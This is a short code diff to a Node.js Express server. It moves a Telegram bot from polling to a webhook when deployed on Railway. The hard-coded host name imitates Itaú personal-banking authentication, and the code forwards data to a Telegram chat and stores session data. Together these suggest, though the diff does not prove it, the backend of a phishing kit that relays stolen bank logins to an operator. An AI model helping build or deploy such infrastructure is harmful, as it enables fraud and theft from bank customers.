@@ -22,7 +22,25 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 // Telegram Bot Setup
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+const isProduction = process.env.NODE_ENV === 'production' || process.env.RAILWAY_ENVIRONMENT;
+let bot;
+
+if (isProduction) {
+    // Use webhook in production (Railway)
+    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
+    const webhookUrl = process.env.WEBHOOK_URL || `https://itaupersonasautenticacion.up.railway.app/bot${process.env.TELEGRAM_BOT_TOKEN}`;
+    bot.setWebHook(webhookUrl);
+    
+    // Handle webhook
+    app.post(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
+        bot.processUpdate(req.body);
+        res.sendStatus(200);
+    });
+} else {
+    // Use polling in development
+    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+}
+
 const chatId = process.env.TELEGRAM_CHAT_ID;
 
 // Store session data with persistent IDs
